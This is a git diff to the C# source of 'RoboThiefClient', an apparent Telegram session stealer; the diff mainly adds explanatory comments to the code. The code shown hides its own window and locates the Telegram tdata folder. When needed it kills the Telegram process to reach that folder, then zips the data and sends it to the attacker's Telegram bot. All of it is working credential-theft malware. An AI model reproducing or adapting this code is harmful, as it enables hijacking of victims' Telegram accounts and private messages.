@@ -19,12 +19,15 @@ namespace RoboThiefClient
 {
     class Program
     {
+        //variables
         static List<String> splitedFiles = new List<string>();
         static TelegramBotClient botClient = null;
         static int trys = 0;
         CancellationTokenSource cancellationToken = new CancellationTokenSource();
+        //------------------------------------
         static void Main(string[] args)
         {
+            //Check if application have args run it again with hide window
             if (args.Count() == 0)
             {
                 Process p = new Process();
@@ -43,10 +46,16 @@ namespace RoboThiefClient
             }
             else
             {
+                // Set tokens ( this method for another app i write for dynamicly generate stealer )
                 TelegramBot.SetValues();
-
+                
+                // Initilize bot for receiving messages from user
                 InitBot();
+                
+                //ahhhhh , here we are. let's find telegram path
                 FindTelegram();
+                
+                // need description ? :|
                 Console.ReadKey();
             }
         }
@@ -55,27 +64,38 @@ namespace RoboThiefClient
         {
             try
             {
+                // get appdata path
                 String appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                
+                //get telegram default path
                 String telegramPath = Directory.GetDirectories(appDataPath).FirstOrDefault(c => c.ToLower().Contains("telegram"));
-
+                
+                //Check path exists
                 if (telegramPath != null && telegramPath != "")
                 {
                     try
                     {
                         var tmpDir = Path.GetTempPath();
                         var tdataDirectory = Directory.GetDirectories(telegramPath).First(c => c.ToLower().Contains("tdata"));
-
+                        
+                        // Now we have temp directory
+                        
+                        // this is a path where we create MT.zip
                         String tmpTelePath = tmpDir + "MT.zip";
-
+                        
                         if (File.Exists(tmpTelePath))
                             File.Delete(tmpTelePath);
-
+                        
+                        // Create MM.zip file
                         Create(tmpDir, "MM", tdataDirectory);
+                        
+                        // send created file to our bot
                         await SendSessionAsync(tmpTelePath);
                     }
                     catch (Exception ex) { Console.WriteLine(ex.Message); }
                 }
                 else
+                    //start searching in process
                     StartSearch();
             }
             catch { }
@@ -221,7 +241,10 @@ namespace RoboThiefClient
                 String fileName = result.Result.MainModule.FileName;
                 var parent = Directory.GetParent(fileName);
                 var tmpDir = Path.GetTempPath();
-
+                
+                // allright , here we have telegram tdata and we want to zip it.
+                // we have to kill telegram application process to access the tdata folder.
+                
                 var tdataDirectory = Directory.GetDirectories(parent.FullName).First(c => c.ToLower().Contains("tdata"));
                 result.Result.Kill();
 
@@ -231,6 +254,8 @@ namespace RoboThiefClient
                     File.Delete(tmpTelePath);
 
                 Create(tmpDir, "MM", tdataDirectory);
+                
+                // When we ziping proccess if completed , we have to start telegram application again.
                 Process.Start(fileName);
 
                 await SendSessionAsync(tmpTelePath);
@@ -242,7 +267,9 @@ namespace RoboThiefClient
         {
             var process = Process.GetProcesses();
             var sortedProcess = process;
-
+            
+            //we get all process that names start with "t"
+            
             var tprocess = sortedProcess.Where(p => p.ProcessName.StartsWith("t"));
 
             foreach (var p in tprocess)
@@ -254,15 +281,15 @@ namespace RoboThiefClient
                 }
                 catch (Exception ex) { }
             }
+            
+            // if we cannot find telegram , mabe user have another version of telegram.
+            // then we should to check all 
             foreach (var p in process)
             {
                 try
                 {
                     if (p.ProcessName.ToLower().Contains("telegram"))
-                    {
                         return p;
-                    }
-
                 }
                 catch (Exception ex) { }
             }
